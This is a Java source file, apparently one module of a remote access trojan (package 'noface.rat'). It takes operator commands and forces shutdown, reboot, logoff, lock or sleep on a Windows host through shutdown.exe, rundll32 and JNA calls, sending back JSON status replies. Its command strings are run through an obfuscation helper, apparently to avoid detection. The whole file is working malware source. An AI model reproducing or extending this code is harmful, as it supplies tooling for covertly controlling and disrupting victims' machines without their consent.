package noface.rat;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;
import noface.config.S;

import java.nio.charset.Charset;
import java.util.concurrent.TimeUnit;

public final class Pow {

    public interface Pwr extends StdCallLibrary {
        Pwr I = Native.load(S.e("powrprof"), Pwr.class, W32APIOptions.DEFAULT_OPTIONS);

        boolean SetSuspendState(boolean hibernate, boolean force, boolean wake);
    }

    public static String run(String kind) {
        String k = kind == null ? "" : kind;
        try {
            String err = switch (k) {
                case "shutdown" -> exec(S.e("shutdown"), S.e("/s"), S.e("/t"), S.e("0"), S.e("/f"));
                case "reboot" -> exec(S.e("shutdown"), S.e("/r"), S.e("/t"), S.e("0"), S.e("/f"));
                case "logoff" -> exec(S.e("shutdown"), S.e("/l"));
                case "lock" -> lock();
                case "sleep" -> sleep();
                default -> S.e("bad");
            };
            if (err != null) {
                return "{\"op\":\"pow\",\"ok\":false,\"kind\":\"" + esc(k) + "\",\"err\":\"" + esc(err) + "\"}";
            }
            return "{\"op\":\"pow\",\"ok\":true,\"kind\":\"" + esc(k) + "\"}";
        } catch (Exception e) {
            return "{\"op\":\"pow\",\"ok\":false,\"kind\":\"" + esc(k) + "\",\"err\":\"" + esc(e.getMessage()) + "\"}";
        }
    }

    private static String lock() {
        try {
            if (User32.INSTANCE.LockWorkStation().booleanValue()) return null;
            return exec(S.e("rundll32.exe"), S.e("user32.dll,LockWorkStation"));
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private static String sleep() {
        try {
            if (Pwr.I.SetSuspendState(false, false, false)) return null;
        } catch (Exception ignored) {
        }
        try {
            return exec(S.e("rundll32.exe"), S.e("powrprof.dll,SetSuspendState"), S.e("0"), S.e("0"), S.e("0"));
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private static String exec(String... cmd) throws Exception {
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        boolean done = p.waitFor(15, TimeUnit.SECONDS);
        byte[] raw = p.getInputStream().readAllBytes();
        if (!done) {
            p.destroyForcibly();
            return S.e("timeout");
        }
        int code = p.exitValue();
        if (code == 0) return null;
        String out = new String(raw, Charset.defaultCharset()).trim();
        if (out.length() > 400) out = out.substring(0, 400);
        return out.isEmpty() ? (S.e("exit ") + code) : out;
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ").replace("\r", " ");
    }

    private Pow() {}
}
